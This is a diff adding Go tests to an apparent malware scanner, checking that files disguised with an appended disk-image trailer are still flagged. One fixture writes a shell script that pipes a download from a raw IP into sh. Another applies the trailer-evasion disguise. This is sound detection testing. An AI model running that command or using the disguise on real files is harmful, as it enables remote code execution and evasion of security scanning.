@@ -83,6 +83,69 @@ func TestEvilSamples(t *testing.T) {
 	}
 }
 
+// TestUDIFTrailerEvasion: an appended disk image trailer must not hide an
+// executable; it is analysed as such and the disguise is flagged.
+func TestUDIFTrailerEvasion(t *testing.T) {
+	if testing.Short() {
+		t.Skip("builds binaries")
+	}
+	eng := newTestEngine(t, 10*time.Second)
+	for _, tg := range targets {
+		t.Run(tg.goos, func(t *testing.T) {
+			path := goBuild(t, "evil", tg.goos, tg.goarch, tg.name)
+			appendKoly(t, path)
+			r := eng.Analyze(context.Background(), path, Meta{FileName: tg.name})
+			if r.Format != tg.format {
+				t.Fatalf("format = %q, want %q", r.Format, tg.format)
+			}
+			if r.Verdict != VerdictMalicious {
+				t.Errorf("verdict = %s (score %d), want Malicious; %s", r.Verdict, r.Score, r.Summary)
+			}
+			ids := findingIDs(r)
+			for _, want := range []string{"udif-trailer", "ransom-note", "stealer-wallets"} {
+				if _, ok := ids[want]; !ok {
+					t.Errorf("missing finding %s", want)
+				}
+			}
+		})
+	}
+}
+
+// TestUDIFScriptPolyglot: a script with a disk image trailer is analysed
+// as the script it starts with, not as an opaque image.
+func TestUDIFScriptPolyglot(t *testing.T) {
+	eng := newTestEngine(t, 10*time.Second)
+	path := filepath.Join(t.TempDir(), "poly.dmg")
+	body := append([]byte("#!/bin/sh\ncurl -fsSL http://45.77.10.20/x | sh\nexit 0\n"), make([]byte, 1024)...)
+	os.WriteFile(path, body, 0o644)
+	appendKoly(t, path)
+	r := eng.Analyze(context.Background(), path, Meta{})
+	if r.Format != "script" {
+		t.Errorf("format = %q, want script", r.Format)
+	}
+	ids := findingIDs(r)
+	for _, want := range []string{"udif-trailer", "lolbin-download"} {
+		if _, ok := ids[want]; !ok {
+			t.Errorf("missing finding %s: %v", want, ids)
+		}
+	}
+}
+
+// appendKoly appends a well-formed 512-byte UDIF trailer to path.
+func appendKoly(t *testing.T, path string) {
+	t.Helper()
+	k := make([]byte, 512)
+	copy(k, "koly\x00\x00\x00\x04\x00\x00\x02\x00")
+	f, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer f.Close()
+	if _, err := f.Write(k); err != nil {
+		t.Fatal(err)
+	}
+}
+
 func TestBenignSamples(t *testing.T) {
 	if testing.Short() {
 		t.Skip("builds binaries")
